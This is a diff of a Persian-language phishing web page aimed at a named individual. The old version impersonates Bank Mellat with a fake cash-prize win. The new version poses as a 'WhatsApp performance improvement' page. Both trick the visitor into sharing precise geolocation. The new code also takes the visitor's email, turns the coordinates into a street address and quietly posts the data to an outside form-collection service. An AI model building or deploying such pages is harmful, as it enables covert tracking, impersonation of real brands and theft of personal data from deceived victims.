@@ -1,18 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>برنده خوش‌شانس بانک ملت</title>
+  <title>بهبود عملکرد واتساپ</title>
   <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
   <link rel="icon" href="https://www.bankmellat.ir/Portals/0/favicon.ico" type="image/x-icon">
   <style>
     body {
       font-family: 'Vazirmatn', sans-serif;
-      background-image: url('https://cdn.pixabay.com/photo/2017/05/09/13/32/money-2290358_1280.jpg');
-      background-size: cover;
-      background-position: center;
+      background-color: #4CAF50;
       margin: 0;
       padding: 0;
       color: #333;
@@ -29,8 +26,9 @@
       background: #fff;
       border-radius: 16px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-      padding: 30px;
-      max-width: 500px;
+      padding: 40px 20px;
+      width: 95%;
+      max-width: 600px;
       text-align: center;
     }
     .card img {
@@ -38,8 +36,8 @@
       margin-bottom: 20px;
     }
     h1 {
-      color: #b30000;
-      font-size: 26px;
+      color: #4CAF50;
+      font-size: 30px;
     }
     h2 {
       font-size: 20px;
@@ -49,18 +47,26 @@
       font-size: 16px;
       margin: 10px 0;
     }
+    input[type="email"] {
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 20px;
+    }
     button {
-      background-color: #b30000;
+      background-color: #4CAF50;
       color: white;
       padding: 12px 24px;
       font-size: 18px;
       border: none;
       border-radius: 8px;
-      margin-top: 20px;
       cursor: pointer;
     }
     button:hover {
-      background-color: #920000;
+      background-color: #388E3C;
     }
     #status {
       margin-top: 15px;
@@ -76,46 +82,70 @@
 <body>
   <div class="overlay">
     <div class="card">
-      <img src="https://www.bankmellat.ir/Portals/0/logo-fa.png" alt="بانک ملت">
-      <h1>تبریک!</h1>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="واتساپ">
+      <h1>بهبود عملکرد واتساپ</h1>
       <h2>حسین قرنی‌زاده عزیز</h2>
-      <p>شما برنده <strong>۱ میلیارد تومان</strong> جایزه نقدی بانک ملت به قید قرعه شدید.</p>
-      <p>برای دریافت جایزه، لطفاً هویت خود را تأیید کنید.</p>
-      <button onclick="getLocation()">تأیید هویت</button>
+
+      <p>برای ادامه لطفاً ایمیل خود را وارد کرده و موقعیت مکانی خود را به اشتراک بگذارید:</p>
+      <input type="email" id="email" placeholder="ایمیل شما" required />
+
+      <button onclick="getLocation()">به اشتراک‌گذاری موقعیت مکانی</button>
       <p id="status"></p>
 
       <form id="gpsForm" action="https://formspree.io/f/xkgrwvde" method="POST" style="display:none;">
-        <input type="hidden" name="latitude" id="latitude">
-        <input type="hidden" name="longitude" id="longitude">
+        <input type="hidden" name="email" id="email_hidden">
+        <input type="hidden" name="location" id="location_address">
       </form>
 
-      <div class="footer">کلیه حقوق متعلق به بانک ملت می‌باشد - 1403</div>
+      <div class="footer">بهبود عملکرد واتساپ</div>
     </div>
   </div>
 
   <script>
     function getLocation() {
+      const email = document.getElementById("email").value;
+      if (!email) {
+        document.getElementById("status").innerText = "لطفاً ابتدا ایمیل خود را وارد کنید.";
+        return;
+      }
+
+      document.getElementById("status").innerText = "در حال تایید موقعیت لطفاً منتظر بمانید...";
       if (navigator.geolocation) {
-        document.getElementById("status").innerText = "در حال تایید هویت لطفاً منتظر بمانید...";
-        navigator.geolocation.getCurrentPosition(sendLocation, showError, {
+        navigator.geolocation.getCurrentPosition(getAddressFromCoords, showError, {
           enableHighAccuracy: true,
           timeout: 10000,
           maximumAge: 0
         });
       } else {
-        document.getElementById("status").innerText = "مرورگر شما تایید هویت را پشتیبانی نمی‌کند.";
+        document.getElementById("status").innerText = "مرورگر شما موقعیت مکانی را پشتیبانی نمی‌کند.";
       }
     }
 
-    function sendLocation(position) {
-      document.getElementById("latitude").value = position.coords.latitude;
-      document.getElementById("longitude").value = position.coords.longitude;
+    function getAddressFromCoords(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const apiURL = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
+
+      fetch(apiURL)
+        .then(response => response.json())
+        .then(data => {
+          const address = data.display_name || `Lat: ${lat}, Lon: ${lon}`;
+          sendForm(address);
+        })
+        .catch(() => {
+          sendForm(`Lat: ${lat}, Lon: ${lon}`);
+        });
+    }
+
+    function sendForm(address) {
+      document.getElementById("email_hidden").value = document.getElementById("email").value;
+      document.getElementById("location_address").value = address;
       document.getElementById("gpsForm").submit();
-      document.getElementById("status").innerText = "تایید هویت با موفقیت به بانک ملت ارسال شد. لطفاً منتظر تأیید باشید...";
+      document.getElementById("status").innerText = "تایید موقعیت انجام شد، اطلاعات ارسال شد.";
     }
 
     function showError(error) {
-      document.getElementById("status").innerText = "خطا در تایید هویت لطفاً مجدداً تلاش فرمایید.";
+      document.getElementById("status").innerText = "خطا در تایید موقعیت. لطفاً مجدداً تلاش فرمایید.";
     }
   </script>
 </body>
